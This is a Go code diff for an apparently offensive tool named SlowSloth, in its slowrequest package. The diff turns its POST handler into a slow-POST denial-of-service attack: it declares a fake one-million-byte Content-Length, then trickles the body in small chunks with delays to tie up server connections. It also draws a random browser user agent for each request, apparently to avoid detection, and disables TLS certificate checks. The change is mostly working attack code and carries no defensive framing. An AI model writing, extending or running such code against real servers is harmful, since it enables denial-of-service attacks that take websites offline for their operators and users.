@@ -1,6 +1,7 @@
 package slowrequest
 
 import (
+	"SlowSloth/common"
 	"SlowSloth/pkg/statusprinter"
 	"crypto/tls"
 	"fmt"
@@ -11,25 +12,6 @@ import (
 	"time"
 )
 
-var userAgents = []string{
-	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36",
-	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36",
-	"Mozilla/5.0 (X11; CrOS x86_64 8172.45.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.64 Safari/537.36",
-	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_2) AppleWebKit/601.3.9 (KHTML, like Gecko) Version/9.0.2 Safari/601.3.9",
-	"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:15.0) Gecko/20100101 Firefox/15.0.1",
-	"Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Mobile/15A372 Safari/604.1",
-	"Mozilla/5.0 (iPhone12,1; U; CPU iPhone OS 13_0 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/15E148 Safari/602.1",
-	"Mozilla/5.0 (iPhone12,1; U; CPU iPhone OS 13_0 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/15E148 Safari/602.1",
-	"Mozilla/5.0 (iPhone13,2; U; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/15E148 Safari/602.1",
-	"Mozilla/5.0 (iPhone14,3; U; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/19A346 Safari/602.1",
-	"Mozilla/5.0 (iPhone14,6; U; CPU iPhone OS 15_4 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/19E241 Safari/602.1",
-	// Add more user agents here
-}
-
-func getRandomUserAgent(r *rand.Rand) string {
-	return userAgents[r.Intn(len(userAgents))]
-}
-
 type RequestStrategy interface {
 	SendRequest(conn net.Conn, urlObj *url.URL, rand *rand.Rand, delay time.Duration) error
 }
@@ -37,7 +19,7 @@ type RequestStrategy interface {
 type GetRequestStrategy struct{}
 
 func (s *GetRequestStrategy) SendRequest(conn net.Conn, urlObj *url.URL, rand *rand.Rand, delay time.Duration) error {
-	userAgent := getRandomUserAgent(rand)
+	userAgent := common.GetRandomUserAgent()
 	requestHeaders := fmt.Sprintf("GET %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\n", urlObj.RequestURI(), urlObj.Hostname(), userAgent)
 	_, err := conn.Write([]byte(requestHeaders))
 	// Additional header writes with delays...
@@ -49,11 +31,40 @@ type PostRequestStrategy struct {
 }
 
 func (s *PostRequestStrategy) SendRequest(conn net.Conn, urlObj *url.URL, rand *rand.Rand, delay time.Duration) error {
-	userAgent := getRandomUserAgent(rand)
-	requestHeaders := fmt.Sprintf("POST %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nContent-Length: %d\r\n\r\n%s", urlObj.RequestURI(), urlObj.Hostname(), userAgent, len(s.Body), s.Body)
+	userAgent := common.GetRandomUserAgent()
+	fakeContentLength := 1000000 // A much larger content length
+	requestHeaders := fmt.Sprintf("POST %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nContent-Length: %d\r\n\r\n", urlObj.RequestURI(), urlObj.Hostname(), userAgent, fakeContentLength)
 	_, err := conn.Write([]byte(requestHeaders))
-	// Additional header writes with delays...
-	return err
+	if err != nil {
+		return err
+	}
+
+	// Write the actual POST data slowly
+	for _, chunk := range splitIntoChunks(s.Body, 10) { // Split the body into chunks
+		_, err = conn.Write([]byte(chunk))
+		if err != nil {
+			return err
+		}
+		time.Sleep(delay)
+	}
+
+	return nil
+}
+
+// splitIntoChunks splits the string into chunks of the specified size.
+func splitIntoChunks(s string, chunkSize int) []string {
+	var chunks []string
+	runes := []rune(s)
+
+	for chunkSize < len(runes) {
+		runes, chunks = runes[chunkSize:], append(chunks, string(runes[:chunkSize]))
+	}
+
+	if len(runes) > 0 {
+		chunks = append(chunks, string(runes))
+	}
+
+	return chunks
 }
 
 type RequestManager struct {
@@ -80,18 +91,34 @@ func (rm *RequestManager) SendSlowRequest(wg *sync.WaitGroup, urlObj *url.URL, d
 	var err error
 
 	if urlObj.Scheme == "https" {
-		conn, err = tls.Dial("tcp", urlObj.Host+":443", &tls.Config{InsecureSkipVerify: true})
+		tlsConfig := &tls.Config{
+			InsecureSkipVerify: true,             // Warning: Only for testing purposes
+			MinVersion:         tls.VersionTLS11, // Set minimum TLS version
+			MaxVersion:         tls.VersionTLS13, // Set maximum TLS version
+			CipherSuites: []uint16{
+				tls.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,
+				tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
+				tls.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,
+				tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
+				tls.TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305,
+				tls.TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305,
+				tls.TLS_RSA_WITH_AES_256_GCM_SHA384,
+				tls.TLS_RSA_WITH_AES_128_GCM_SHA256,
+			},
+		}
+		conn, err = tls.Dial("tcp", urlObj.Host+":443", tlsConfig)
 	} else {
 		conn, err = net.Dial("tcp", urlObj.Host)
 	}
+
 	if err != nil {
 		rm.statusManager.SetServiceAvailable(false)
 		return
 	}
 	defer conn.Close()
 
-	// Send the initial part of the request (e.g., partial headers)
-	_, err = conn.Write([]byte("GET / HTTP/1.1\r\nHost: " + urlObj.Hostname() + "\r\nUser-Agent: " + getRandomUserAgent(rm.rand) + "\r\n"))
+	// Send the initial part of the request using the strategy pattern
+	err = rm.strategy.SendRequest(conn, urlObj, rm.rand, delay)
 	if err != nil {
 		return
 	}
